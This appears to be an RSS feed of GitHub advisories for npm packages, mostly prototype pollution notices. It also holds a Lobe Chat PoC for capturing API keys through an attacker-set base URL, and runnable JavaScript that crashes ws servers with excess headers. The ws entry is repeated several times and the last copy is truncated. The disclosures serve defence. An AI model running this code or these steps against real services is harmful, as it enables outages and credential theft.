<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2024-06-19T11:01:16.743Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[@akbr/update] @akbr/update Prototype Pollution]]></title>
        <id>https://github.com/advisories/GHSA-mj4p-gmhr-92g3</id>
        <link href="https://github.com/advisories/GHSA-mj4p-gmhr-92g3"/>
        <updated>2024-06-17T22:30:08.000Z</updated>
        <content type="html"><![CDATA[<p>akbr update 1.0.0 is vulnerable to Prototype Pollution via update/index.js.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-36578">https://nvd.nist.gov/vuln/detail/CVE-2024-36578</a></li>
<li><a href="https://gist.github.com/mestrtee/8bc749ec2b5453d887b2f4a362a65897">https://gist.github.com/mestrtee/8bc749ec2b5453d887b2f4a362a65897</a></li>
<li><a href="https://github.com/advisories/GHSA-mj4p-gmhr-92g3">https://github.com/advisories/GHSA-mj4p-gmhr-92g3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mj4p-gmhr-92g3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-17T18:31:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@apphp/object-resolver] Object Resolver Prototype Pollution]]></title>
        <id>https://github.com/advisories/GHSA-qj86-v6m7-4qv2</id>
        <link href="https://github.com/advisories/GHSA-qj86-v6m7-4qv2"/>
        <updated>2024-06-17T22:30:03.000Z</updated>
        <content type="html"><![CDATA[<p>apphp js-object-resolver &lt; 3.1.1 is vulnerable to Prototype Pollution via Module.setNestedProperty.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-36577">https://nvd.nist.gov/vuln/detail/CVE-2024-36577</a></li>
<li><a href="https://gist.github.com/mestrtee/c90189f3d8480a5f267395ec40701373">https://gist.github.com/mestrtee/c90189f3d8480a5f267395ec40701373</a></li>
<li><a href="https://github.com/apphp/js-object-resolver/commit/7e347a26bf04d6a4f7525f6605666afbb218afca">https://github.com/apphp/js-object-resolver/commit/7e347a26bf04d6a4f7525f6605666afbb218afca</a></li>
<li><a href="https://github.com/advisories/GHSA-qj86-v6m7-4qv2">https://github.com/advisories/GHSA-qj86-v6m7-4qv2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qj86-v6m7-4qv2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-17T18:31:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@allanlancioni/flatten-json] flatten-json Prototype Pollution]]></title>
        <id>https://github.com/advisories/GHSA-j8px-pjmp-325f</id>
        <link href="https://github.com/advisories/GHSA-j8px-pjmp-325f"/>
        <updated>2024-06-17T22:29:53.000Z</updated>
        <content type="html"><![CDATA[<p>A Prototype Pollution issue in flatten-json 1.0.1 allows an attacker to execute arbitrary code via module.exports.unflattenJSON (flatten-json/index.js:42)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-36574">https://nvd.nist.gov/vuln/detail/CVE-2024-36574</a></li>
<li><a href="https://gist.github.com/mestrtee/d5a0c93459599f77557b5bbe78b57325">https://gist.github.com/mestrtee/d5a0c93459599f77557b5bbe78b57325</a></li>
<li><a href="https://github.com/advisories/GHSA-j8px-pjmp-325f">https://github.com/advisories/GHSA-j8px-pjmp-325f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j8px-pjmp-325f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-17T18:31:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@almela/obx] obx Prototype Pollution]]></title>
        <id>https://github.com/advisories/GHSA-jj58-488v-4rgf</id>
        <link href="https://github.com/advisories/GHSA-jj58-488v-4rgf"/>
        <updated>2024-06-17T22:29:48.000Z</updated>
        <content type="html"><![CDATA[<p>almela obx before v.0.0.4 has a Prototype Pollution issue which allows arbitrary code execution via the obx/build/index.js:656), reduce (@almela/obx/build/index.js:470), Object.set (obx/build/index.js:269) component.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-36573">https://nvd.nist.gov/vuln/detail/CVE-2024-36573</a></li>
<li><a href="https://gist.github.com/mestrtee/fd8181bbc180d775f8367a2b9e0ffcd1">https://gist.github.com/mestrtee/fd8181bbc180d775f8367a2b9e0ffcd1</a></li>
<li><a href="https://github.com/llGaetanll/obx/commit/984ad92dc06774da4e6bdae0f5f5e59ae80ece8f">https://github.com/llGaetanll/obx/commit/984ad92dc06774da4e6bdae0f5f5e59ae80ece8f</a></li>
<li><a href="https://github.com/advisories/GHSA-jj58-488v-4rgf">https://github.com/advisories/GHSA-jj58-488v-4rgf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jj58-488v-4rgf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-17T18:31:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@lobehub/chat] Lobe Chat API Key Leak]]></title>
        <id>https://github.com/advisories/GHSA-p36r-qxgx-jq2v</id>
        <link href="https://github.com/advisories/GHSA-p36r-qxgx-jq2v"/>
        <updated>2024-06-17T22:28:43.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>If an attacker can successfully authenticate through SSO/Access Code, they can obtain the real backend API Key by modifying the base URL to their own attack URL on the frontend and setting up a server-side request.</p>
<h3 id="details">Details</h3>
<p>The attack process is described above.</p>
<p><img alt="image" src="https://github.com/lobehub/lobe-chat/assets/36695271/df5e0c3c-af28-45c3-959f-182cc9d06680"></p>
<h3 id="poc">PoC</h3>
<p>Frontend:</p>
<ol>
<li>Pass basic authentication (SSO/Access Code).</li>
<li>Set the Base URL to a private attack address.</li>
<li>Configure the request method to be a server-side request.</li>
<li>At the self-set attack address, retrieve the API Key information from the request headers.</li>
</ol>
<p>Backend:</p>
<ol>
<li>The LobeChat version allows setting the Base URL.</li>
<li>There is no outbound traffic whitelist.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>All community version LobeChat users using SSO/Access Code authentication, tested on version 0.162.13.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lobehub/lobe-chat/security/advisories/GHSA-p36r-qxgx-jq2v">https://github.com/lobehub/lobe-chat/security/advisories/GHSA-p36r-qxgx-jq2v</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37895">https://nvd.nist.gov/vuln/detail/CVE-2024-37895</a></li>
<li><a href="https://github.com/advisories/GHSA-p36r-qxgx-jq2v">https://github.com/advisories/GHSA-p36r-qxgx-jq2v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p36r-qxgx-jq2v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-17T22:28:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@abw/badger-database] Badger Database Prototype Pollution]]></title>
        <id>https://github.com/advisories/GHSA-69r2-2fg7-7hf9</id>
        <link href="https://github.com/advisories/GHSA-69r2-2fg7-7hf9"/>
        <updated>2024-06-17T21:37:53.000Z</updated>
        <content type="html"><![CDATA[<p>A Prototype Pollution issue in abw badger-database 1.2.1 allows an attacker to execute arbitrary code via dist/badger-database.esm.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-36581">https://nvd.nist.gov/vuln/detail/CVE-2024-36581</a></li>
<li><a href="https://gist.github.com/mestrtee/f6b2ed1b3b4bc0df994c7455fc6110bd">https://gist.github.com/mestrtee/f6b2ed1b3b4bc0df994c7455fc6110bd</a></li>
<li><a href="https://github.com/advisories/GHSA-69r2-2fg7-7hf9">https://github.com/advisories/GHSA-69r2-2fg7-7hf9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-69r2-2fg7-7hf9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-17T15:30:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@alexbinary/object-deep-assign] object-deep-assign Prototype Pollution]]></title>
        <id>https://github.com/advisories/GHSA-4xg3-7w7q-856q</id>
        <link href="https://github.com/advisories/GHSA-4xg3-7w7q-856q"/>
        <updated>2024-06-17T21:37:38.000Z</updated>
        <content type="html"><![CDATA[<p>alexbinary object-deep-assign 1.0.11 is vulnerable to Prototype Pollution via the extend() method of Module.deepAssign (/src/index.js)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-36582">https://nvd.nist.gov/vuln/detail/CVE-2024-36582</a></li>
<li><a href="https://gist.github.com/mestrtee/9fe4d3a862c62ce6b2b0d20d4c5fd346">https://gist.github.com/mestrtee/9fe4d3a862c62ce6b2b0d20d4c5fd346</a></li>
<li><a href="https://github.com/advisories/GHSA-4xg3-7w7q-856q">https://github.com/advisories/GHSA-4xg3-7w7q-856q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4xg3-7w7q-856q</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-17T15:30:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@cdr0/sg] @cdr0/sg Prototype Pollution]]></title>
        <id>https://github.com/advisories/GHSA-fg52-5jjj-28h7</id>
        <link href="https://github.com/advisories/GHSA-fg52-5jjj-28h7"/>
        <updated>2024-06-17T21:29:55.000Z</updated>
        <content type="html"><![CDATA[<p>A Prototype Pollution issue in cdr0 sg 1.0.10 allows an attacker to execute arbitrary code.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-36580">https://nvd.nist.gov/vuln/detail/CVE-2024-36580</a></li>
<li><a href="https://gist.github.com/mestrtee/a75d75eca4622ad08f7cfa903a6cc9c3">https://gist.github.com/mestrtee/a75d75eca4622ad08f7cfa903a6cc9c3</a></li>
<li><a href="https://github.com/briancsparks/cdr0-sg/issues/11">https://github.com/briancsparks/cdr0-sg/issues/11</a></li>
<li><a href="https://github.com/advisories/GHSA-fg52-5jjj-28h7">https://github.com/advisories/GHSA-fg52-5jjj-28h7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fg52-5jjj-28h7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-17T15:30:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mattermost-desktop] Mattermost Desktop App allows for bypassing TCC restrictions on macOS]]></title>
        <id>https://github.com/advisories/GHSA-xgqm-wp7w-mgg2</id>
        <link href="https://github.com/advisories/GHSA-xgqm-wp7w-mgg2"/>
        <updated>2024-06-17T21:23:50.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost Desktop App versions &lt;=5.7.0 fail to disable certain Electron debug flags which allows for bypassing&nbsp;TCC restrictions on macOS.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-36287">https://nvd.nist.gov/vuln/detail/CVE-2024-36287</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/advisories/GHSA-xgqm-wp7w-mgg2">https://github.com/advisories/GHSA-xgqm-wp7w-mgg2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xgqm-wp7w-mgg2</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-06-14T09:31:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mattermost-desktop] Mattermost Desktop App Remote Code Execution]]></title>
        <id>https://github.com/advisories/GHSA-hvxg-77mg-vrvp</id>
        <link href="https://github.com/advisories/GHSA-hvxg-77mg-vrvp"/>
        <updated>2024-06-17T21:23:18.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost Desktop App versions &lt;=5.7.0 fail to correctly prompt for permission when opening external URLs which allows&nbsp;a remote attacker to force a victim over the Internet to run arbitrary programs on the victim's system&nbsp;via custom URI schemes.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37182">https://nvd.nist.gov/vuln/detail/CVE-2024-37182</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/mattermost/desktop/commit/1c9fc719dc2b74495a05f7ebc90e92e7daa03e6d">https://github.com/mattermost/desktop/commit/1c9fc719dc2b74495a05f7ebc90e92e7daa03e6d</a></li>
<li><a href="https://github.com/advisories/GHSA-hvxg-77mg-vrvp">https://github.com/advisories/GHSA-hvxg-77mg-vrvp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hvxg-77mg-vrvp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-14T09:31:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ws] ws affected by a DoS when handling a request with many HTTP headers]]></title>
        <id>https://github.com/advisories/GHSA-3h5v-q93c-6h6q</id>
        <link href="https://github.com/advisories/GHSA-3h5v-q93c-6h6q"/>
        <updated>2024-06-17T19:09:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A request with a number of headers exceeding the<a href="https://nodejs.org/api/http.html#servermaxheaderscount"><code>server.maxHeadersCount</code></a> threshold could be used to crash a ws server.</p>
<h3 id="proof-of-concept">Proof of concept</h3>
<pre><code class="language-js">const http = require('http');
const WebSocket = require('ws');

const wss = new WebSocket.Server({ port: 0 }, function () {
  const chars = "!#$%&amp;'*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~".split('');
  const headers = {};
  let count = 0;

  for (let i = 0; i &lt; chars.length; i++) {
    if (count === 2000) break;

    for (let j = 0; j &lt; chars.length; j++) {
      const key = chars[i] + chars[j];
      headers[key] = 'x';

      if (++count === 2000) break;
    }
  }

  headers.Connection = 'Upgrade';
  headers.Upgrade = 'websocket';
  headers['Sec-WebSocket-Key'] = 'dGhlIHNhbXBsZSBub25jZQ==';
  headers['Sec-WebSocket-Version'] = '13';

  const request = http.request({
    headers: headers,
    host: '127.0.0.1',
    port: wss.address().port
  });

  request.end();
});
</code></pre>
<h3 id="patches">Patches</h3>
<p>The vulnerability was fixed in <a href="mailto:ws@8.17.1">ws@8.17.1</a> (<a href="https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c">https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c</a>) and backported to <a href="mailto:ws@7.5.10">ws@7.5.10</a> (<a href="https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f">https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f</a>), <a href="mailto:ws@6.2.3">ws@6.2.3</a> (<a href="https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63">https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63</a>), and <a href="mailto:ws@5.2.4">ws@5.2.4</a> (<a href="https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e">https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e</a>)</p>
<h3 id="workarounds">Workarounds</h3>
<p>In vulnerable versions of ws, the issue can be mitigated in the following ways:</p>
<ol>
<li>Reduce the maximum allowed length of the request headers using the <a href="https://nodejs.org/api/cli.html#--max-http-header-sizesize"><code>--max-http-header-size=size</code></a> and/or the <a href="https://nodejs.org/api/http.html#httpcreateserveroptions-requestlistener"><code>maxHeaderSize</code></a> options so that no more headers than the <code>server.maxHeadersCount</code> limit can be sent.</li>
<li>Set <code>server.maxHeadersCount</code> to <code>0</code> so that no limit is applied.</li>
</ol>
<h3 id="credits">Credits</h3>
<p>The vulnerability was reported by <a href="https://github.com/rrlapointe">Ryan LaPointe</a> in <a href="https://github.com/websockets/ws/issues/2230">https://github.com/websockets/ws/issues/2230</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/websockets/ws/issues/2230">https://github.com/websockets/ws/issues/2230</a></li>
<li><a href="https://github.com/websockets/ws/pull/2231">https://github.com/websockets/ws/pull/2231</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/websockets/ws/security/advisories/GHSA-3h5v-q93c-6h6q">https://github.com/websockets/ws/security/advisories/GHSA-3h5v-q93c-6h6q</a></li>
<li><a href="https://github.com/websockets/ws/issues/2230">https://github.com/websockets/ws/issues/2230</a></li>
<li><a href="https://github.com/websockets/ws/pull/2231">https://github.com/websockets/ws/pull/2231</a></li>
<li><a href="https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f">https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f</a></li>
<li><a href="https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e">https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e</a></li>
<li><a href="https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c">https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c</a></li>
<li><a href="https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63">https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63</a></li>
<li><a href="https://github.com/advisories/GHSA-3h5v-q93c-6h6q">https://github.com/advisories/GHSA-3h5v-q93c-6h6q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3h5v-q93c-6h6q</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-17T19:09:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ws] ws affected by a DoS when handling a request with many HTTP headers]]></title>
        <id>https://github.com/advisories/GHSA-3h5v-q93c-6h6q</id>
        <link href="https://github.com/advisories/GHSA-3h5v-q93c-6h6q"/>
        <updated>2024-06-17T19:09:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A request with a number of headers exceeding the<a href="https://nodejs.org/api/http.html#servermaxheaderscount"><code>server.maxHeadersCount</code></a> threshold could be used to crash a ws server.</p>
<h3 id="proof-of-concept">Proof of concept</h3>
<pre><code class="language-js">const http = require('http');
const WebSocket = require('ws');

const wss = new WebSocket.Server({ port: 0 }, function () {
  const chars = "!#$%&amp;'*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~".split('');
  const headers = {};
  let count = 0;

  for (let i = 0; i &lt; chars.length; i++) {
    if (count === 2000) break;

    for (let j = 0; j &lt; chars.length; j++) {
      const key = chars[i] + chars[j];
      headers[key] = 'x';

      if (++count === 2000) break;
    }
  }

  headers.Connection = 'Upgrade';
  headers.Upgrade = 'websocket';
  headers['Sec-WebSocket-Key'] = 'dGhlIHNhbXBsZSBub25jZQ==';
  headers['Sec-WebSocket-Version'] = '13';

  const request = http.request({
    headers: headers,
    host: '127.0.0.1',
    port: wss.address().port
  });

  request.end();
});
</code></pre>
<h3 id="patches">Patches</h3>
<p>The vulnerability was fixed in <a href="mailto:ws@8.17.1">ws@8.17.1</a> (<a href="https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c">https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c</a>) and backported to <a href="mailto:ws@7.5.10">ws@7.5.10</a> (<a href="https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f">https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f</a>), <a href="mailto:ws@6.2.3">ws@6.2.3</a> (<a href="https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63">https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63</a>), and <a href="mailto:ws@5.2.4">ws@5.2.4</a> (<a href="https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e">https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e</a>)</p>
<h3 id="workarounds">Workarounds</h3>
<p>In vulnerable versions of ws, the issue can be mitigated in the following ways:</p>
<ol>
<li>Reduce the maximum allowed length of the request headers using the <a href="https://nodejs.org/api/cli.html#--max-http-header-sizesize"><code>--max-http-header-size=size</code></a> and/or the <a href="https://nodejs.org/api/http.html#httpcreateserveroptions-requestlistener"><code>maxHeaderSize</code></a> options so that no more headers than the <code>server.maxHeadersCount</code> limit can be sent.</li>
<li>Set <code>server.maxHeadersCount</code> to <code>0</code> so that no limit is applied.</li>
</ol>
<h3 id="credits">Credits</h3>
<p>The vulnerability was reported by <a href="https://github.com/rrlapointe">Ryan LaPointe</a> in <a href="https://github.com/websockets/ws/issues/2230">https://github.com/websockets/ws/issues/2230</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/websockets/ws/issues/2230">https://github.com/websockets/ws/issues/2230</a></li>
<li><a href="https://github.com/websockets/ws/pull/2231">https://github.com/websockets/ws/pull/2231</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/websockets/ws/security/advisories/GHSA-3h5v-q93c-6h6q">https://github.com/websockets/ws/security/advisories/GHSA-3h5v-q93c-6h6q</a></li>
<li><a href="https://github.com/websockets/ws/issues/2230">https://github.com/websockets/ws/issues/2230</a></li>
<li><a href="https://github.com/websockets/ws/pull/2231">https://github.com/websockets/ws/pull/2231</a></li>
<li><a href="https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f">https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f</a></li>
<li><a href="https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e">https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e</a></li>
<li><a href="https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c">https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c</a></li>
<li><a href="https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63">https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63</a></li>
<li><a href="https://github.com/advisories/GHSA-3h5v-q93c-6h6q">https://github.com/advisories/GHSA-3h5v-q93c-6h6q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3h5v-q93c-6h6q</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-17T19:09:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ws] ws affected by a DoS when handling a request with many HTTP headers]]></title>
        <id>https://github.com/advisories/GHSA-3h5v-q93c-6h6q</id>
        <link href="https://github.com/advisories/GHSA-3h5v-q93c-6h6q"/>
        <updated>2024-06-17T19:09:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A request with a number of headers exceeding the<a href="https://nodejs.org/api/http.html#servermaxheaderscount"><code>server.maxHeadersCount</code></a> threshold could be used to crash a ws server.</p>
<h3 id="proof-of-concept">Proof of concept</h3>
<pre><code class="language-js">const http = require('http');
const WebSocket = require('ws');

const wss = new WebSocket.Server({ port: 0 }, function () {
  const chars = "!#$%&amp;'*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~".split('');
  const headers = {};
  let count = 0;

  for (let i = 0; i &lt; chars.length; i++) {
    if (count === 2000) break;

    for (let j = 0; j &lt; chars.length; j++) {
      const key = chars[i] + chars[j];
      headers[key] = 'x';

      if (++count === 2000) break;
    }
  }

  headers.Connection = 'Upgrade';
  headers.Upgrade = 'websocket';
  headers['Sec-WebSocket-Key'] = 'dGhlIHNhbXBsZSBub25jZQ==';
  headers['Sec-WebSocket-Version'] = '13';

  const request = http.request({
    headers: headers,
    host: '127.0.0.1',
    port: wss.address().port
  });

  request.end();
});
</code></pre>
<h3 id="patches">Patches</h3>
<p>The vulnerability was fixed in <a href="mailto:ws@8.17.1">ws@8.17.1</a> (<a href="https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c">https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c</a>) and backported to <a href="mailto:ws@7.5.10">ws@7.5.10</a> (<a href="https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f">https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f</a>), <a href="mailto:ws@6.2.3">ws@6.2.3</a> (<a href="https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63">https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63</a>), and <a href="mailto:ws@5.2.4">ws@5.2.4</a> (<a href="https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e">https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e</a>)</p>
<h3 id="workarounds">Workarounds</h3>
<p>In vulnerable versions of ws, the issue can be mitigated in the following ways:</p>
<ol>
<li>Reduce the maximum allowed length of the request headers using the <a href="https://nodejs.org/api/cli.html#--max-http-header-sizesize"><code>--max-http-header-size=size</code></a> and/or the <a href="https://nodejs.org/api/http.html#httpcreateserveroptions-requestlistener"><code>maxHeaderSize</code></a> options so that no more headers than the <code>server.maxHeadersCount</code> limit can be sent.</li>
<li>Set <code>server.maxHeadersCount</code> to <code>0</code> so that no limit is applied.</li>
</ol>
<h3 id="credits">Credits</h3>
<p>The vulnerability was reported by <a href="https://github.com/rrlapointe">Ryan LaPointe</a> in <a href="https://github.com/websockets/ws/issues/2230">https://github.com/websockets/ws/issues/2230</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/websockets/ws/issues/2230">https://github.com/websockets/ws/issues/2230</a></li>
<li><a href="https://github.com/websockets/ws/pull/2231">https://github.com/websockets/ws/pull/2231</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/websockets/ws/security/advisories/GHSA-3h5v-q93c-6h6q">https://github.com/websockets/ws/security/advisories/GHSA-3h5v-q93c-6h6q</a></li>
<li><a href="https://github.com/websockets/ws/issues/2230">https://github.com/websockets/ws/issues/2230</a></li>
<li><a href="https://github.com/websockets/ws/pull/2231">https://github.com/websockets/ws/pull/2231</a></li>
<li><a href="https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f">https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f</a></li>
<li><a href="https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e">https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e</a></li>
<li><a href="https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c">https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c</a></li>
<li><a href="https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63">https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63</a></li>
<li><a href="https://github.com/advisories/GHSA-3h5v-q93c-6h6q">https://github.com/advisories/GHSA-3h5v-q93c-6h6q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3h5v-q93c-6h6q</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-17T19:09:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ws] ws affected by a DoS when handling a request with many HTTP headers]]></title>
        <id>https://github.com/advisories/GHSA-3h5v-q93c-6h6q</id>
        <link href="https://github.com/advisories/GHSA-3h5v-q93c-6h6q"/>
        <updated>2024-06-17T19:09:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A request with a number of headers exceeding the<a href="https://nodejs.org/api/http.html#servermaxheaderscount"><code>server.maxHeadersCount</code></a> threshold could be used to crash a ws server.</p>
<h3 id="proof-of-concept">Proof of concept</h3>
